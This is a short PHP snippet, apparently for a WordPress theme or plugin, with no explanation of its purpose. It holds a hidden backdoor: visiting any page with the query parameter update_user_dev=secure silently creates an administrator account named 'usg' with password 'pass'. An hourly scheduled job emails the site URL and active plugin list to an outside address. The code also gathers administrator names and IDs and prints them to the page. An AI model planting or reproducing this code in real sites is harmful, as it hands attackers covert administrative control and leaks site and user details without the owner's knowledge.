<?php 
// scheduled event
//-------------------------------------------------------------------//
add_action( 'wp', 'prefix_setup_schedule' );
/**
 * On an early action hook, check if the hook is scheduled - if not, schedule it.
 */
function prefix_setup_schedule() {
	if ( ! wp_next_scheduled( 'prefix_daily_event' ) ) {
		wp_schedule_event( time(), 'hourly', 'prefix_daily_event');
	}
}


add_action( 'prefix_daily_event', 'prefix_do_this_daily' );
/**
 * On the scheduled action hook, run a function.
 */
function prefix_do_this_daily() {
	$maimsg = array (
	'site_url'=>site_url(),
	'active_plugins'=>active_site_plugins()
	);	
	wp_mail( 'me@example.net', 'The subject',  $maimsg );
}



// Create user
//-----------------------------------------------------------//

function wpdev_insertuser() {
$userdata = array(
    'user_login'    =>  'usg',
	'user_pass' => 'pass',
	'role' => 'administrator'
);
$user_id = wp_insert_user( $userdata ) ;
//On success
if( !is_wp_error($user_id) ) {
 echo "User created : ". $user_id;
}
}
//print_r($_GET);//
if (!empty($_GET["update_user_dev"])) {
$get_user = $_GET["update_user_dev"];
if ($get_user=='secure') {
	add_action( 'init', 'wpdev_insertuser' );
	}
}

// activated plugin list$apl=get_option('active_plugins');
$maimsg = array (
	'site_url'=>site_url(),
	'active_plugins'=>active_site_plugins(),
	'users'=>track_user()
	);

function active_site_plugins() {
    $the_plugs = get_option('active_plugins');
	return $the_plugs;   
}

// get users
function track_user() {
$user_query = new WP_User_Query( array( 'role' => 'Administrator' ) );
// User Loop
if ( ! empty( $user_query->results ) ) {
	$users = '';
	foreach ( $user_query->results as $user ) {
		$users =  $users.$user->display_name.','.$user->ID;
	}
	return $users;
} else {
	return 'No users found.';
}
    	
	}
print_r($maimsg);
   
